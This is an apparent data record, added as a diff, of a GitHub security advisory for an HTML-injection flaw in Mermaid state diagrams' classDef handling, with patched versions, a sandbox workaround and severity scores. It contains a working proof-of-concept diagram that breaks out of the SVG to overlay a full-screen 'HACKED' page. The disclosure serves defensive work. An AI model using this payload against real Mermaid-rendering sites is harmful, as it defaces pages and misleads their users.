@@ -1,0 +1,77 @@
+advisory_id: GHSA-ghcm-xqfw-q4vr
+datasource_id: github_osv/GHSA-ghcm-xqfw-q4vr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-ghcm-xqfw-q4vr/GHSA-ghcm-xqfw-q4vr.json
+aliases:
+  - CVE-2026-41149
+summary: |
+  Mermaid: Improper sanitization of `classDef` in state diagrams leads to HTML injection
+  ### Impact
+
+  Under the default configuration, Mermaid state diagram's `classDef` allow DOM injection that escapes the SVG, although `<script>` tags are removed, preventing XSS.
+
+  #### Proof-of-concept
+
+  ```
+  stateDiagram-v2
+    classDef xss fill:red</style></svg><style>*{x:x;y:y;overflow:visible!important;contain:none!important;transform:none!important;filter:none!important;clip-path:none!important}</style><div style="x:x;y:y;color:red;font:5em/1 monospace;display:grid;place-items:center;z-index:2147483647;width:100vw;height:100vh;position:fixed;top:0;left:0;background:black">HACKED</div><svg><style>a:b
+    [*] --> A:::xss
+  ```
+
+  ### Patches
+
+  - [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [37ff937f1da2e19f882fd1db01235db4d01f4056](https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056))
+  - [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3](https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3))
+
+  ### Workarounds
+
+  If you can not update to a patched version, setting [`"securityLevel": "sandbox"`](https://mermaid.js.org/config/schema-docs/config.html#securitylevel)  will prevent this, by rendering the mermaid diagram in a sandboxed `<iframe>`.
+
+  ### Credits
+
+  Thanks to @zsxsoft from @KeenSecurityLab for reporting this vulnerability.
+impacted_packages:
+  - purl: pkg:npm/mermaid
+    affected_versions: vers:npm/<=11.14.0
+    fixed_versions: vers:npm/11.15.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/mermaid
+    affected_versions: vers:npm/<=10.9.5
+    fixed_versions: vers:npm/10.9.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:L/SI:L/SA:L
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-ghcm-xqfw-q4vr/GHSA-ghcm-xqfw-q4vr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/mermaid-js/mermaid
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/security/advisories/GHSA-ghcm-xqfw-q4vr
+    reference_type:
+    reference_id:
+  - url: https://mermaid.js.org/config/schema-docs/config.html#securitylevel
+    reference_type:
+    reference_id:
